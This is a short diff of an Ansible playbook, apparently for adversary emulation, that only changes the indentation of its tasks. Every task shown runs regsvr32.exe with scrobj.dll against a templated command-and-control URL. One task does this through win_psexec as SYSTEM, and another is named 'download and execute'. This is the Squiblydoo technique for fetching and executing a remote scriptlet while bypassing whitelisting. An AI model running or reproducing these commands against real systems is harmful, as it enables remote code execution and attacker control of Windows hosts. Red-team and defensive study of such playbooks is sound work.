@@ -5,11 +5,11 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-  - name: Run regedit.exe locally (on target node) as SYSTEM and interactively
-    win_psexec:
-      command: regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
-      interactive: yes
-      system: yes
+    - name: Run regedit.exe locally (on target node) as SYSTEM and interactively
+      win_psexec:
+        command: regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
+        interactive: yes
+        system: yes
     - name: download and execute
       win_command: |
         regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
